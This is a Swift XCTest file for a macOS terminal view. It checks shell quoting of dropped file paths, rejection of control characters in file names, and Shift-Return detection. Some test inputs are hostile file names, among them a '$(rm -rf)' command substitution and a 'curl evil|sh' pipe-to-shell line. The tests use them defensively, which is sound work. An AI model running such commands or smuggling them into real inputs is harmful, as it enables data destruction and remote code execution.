import AppKit
import XCTest
@testable import Taki

/// What a drop types into the prompt, and which keys count as Shift-Return.
@MainActor
final class TakiTerminalViewTests: XCTestCase {
    func testPlainPathsStayReadable() {
        XCTAssertEqual(TakiTerminalView.shellQuoted("/Users/me/shot-1.png"), "/Users/me/shot-1.png")
    }

    func testSpacesAndQuotesAreQuotedSafely() {
        XCTAssertEqual(TakiTerminalView.shellQuoted("/Users/me/Screen Shot.png"), "'/Users/me/Screen Shot.png'")
        XCTAssertEqual(TakiTerminalView.shellQuoted("/tmp/it's.png"), "'/tmp/it'\\''s.png'")
        XCTAssertEqual(TakiTerminalView.shellQuoted("/tmp/$(rm -rf).png"), "'/tmp/$(rm -rf).png'")
    }

    func testDropTypesWordsWithATrailingSpaceAndNoReturn() {
        let text = TakiTerminalView.typedText(for: ["/a.png", "/b c.png"])
        XCTAssertEqual(text, "/a.png '/b c.png' ")
    }

    func testNamesWithControlCharactersAreNeverTyped() {
        // Ctrl-C, Return, line feed, Escape and DEL in a file name would act as keystrokes.
        for evil in ["/tmp/x\u{03}; curl evil|sh\r", "/tmp/a\nb", "/tmp/\u{1b}[2J", "/tmp/del\u{7f}", "/tmp/c1\u{9b}"] {
            XCTAssertNil(TakiTerminalView.typedText(for: [evil]), evil.debugDescription)
        }
        XCTAssertEqual(TakiTerminalView.typedText(for: ["/tmp/ok.png", "/tmp/bad\r.png"]), "/tmp/ok.png ")
        XCTAssertNil(TakiTerminalView.typedText(for: []))
    }

    func testDroppedFileURLsBecomePaths() {
        let pb = NSPasteboard(name: .init("taki-test-\(UUID().uuidString)"))
        pb.clearContents()
        pb.writeObjects([URL(fileURLWithPath: "/tmp/one.png") as NSURL, URL(fileURLWithPath: "/tmp/two words.txt") as NSURL])
        XCTAssertEqual(TakiTerminalView.droppedPaths(from: pb, imageFolder: nil), ["/tmp/one.png", "/tmp/two words.txt"])
        pb.releaseGlobally()
    }

    func testShiftReturnOnlyWithShiftAlone() {
        XCTAssertTrue(TakiTerminalView.isShiftReturn(keyCode: 36, flags: [.shift]))
        XCTAssertTrue(TakiTerminalView.isShiftReturn(keyCode: 76, flags: [.shift, .numericPad]))
        XCTAssertFalse(TakiTerminalView.isShiftReturn(keyCode: 36, flags: []))
        XCTAssertFalse(TakiTerminalView.isShiftReturn(keyCode: 36, flags: [.shift, .command]))
        XCTAssertFalse(TakiTerminalView.isShiftReturn(keyCode: 0, flags: [.shift]))
    }
}
